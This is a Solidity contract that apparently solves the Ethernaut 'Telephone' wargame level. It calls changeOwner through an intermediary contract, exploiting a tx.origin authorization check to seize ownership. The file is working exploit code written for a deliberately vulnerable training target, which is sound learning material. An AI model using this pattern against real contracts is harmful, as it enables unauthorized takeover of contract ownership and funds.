// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ethernaut/Telephone.sol";

contract HackTelephone {
    address public owner;
    Telephone private _telephoneContract;
    address public desiredOwner;

    constructor(address telephoneContract, address _desiredOwner) {
        _telephoneContract = Telephone(telephoneContract);
        desiredOwner = _desiredOwner;
    }

    function attack() public {
        _telephoneContract.changeOwner(desiredOwner);
    }
}